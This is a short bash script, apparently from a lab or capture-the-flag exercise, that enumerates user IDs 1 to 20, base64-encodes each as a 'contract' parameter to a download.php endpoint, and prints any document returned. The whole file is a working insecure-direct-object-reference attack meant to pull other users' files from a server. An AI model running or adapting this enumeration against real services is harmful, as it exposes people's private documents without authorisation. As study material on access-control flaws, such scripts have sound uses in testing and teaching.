#!/bin/bash
url="http://ip/download.php?contract="
for i in {1..20}; do
    # uid to base64
    encodedid=$(echo -n $i | base64 -w 0)
    
    echo "user $i (contract=$encodedid)..."
    
    # request n capture response
    response=$(curl -s "${url}${encodedid}")
    
    # if a content
    if [[ ${#response} -gt 10 ]]; then
        echo "Found in user $i:"
        echo "$response"
    else
        echo "none"
    fi
done
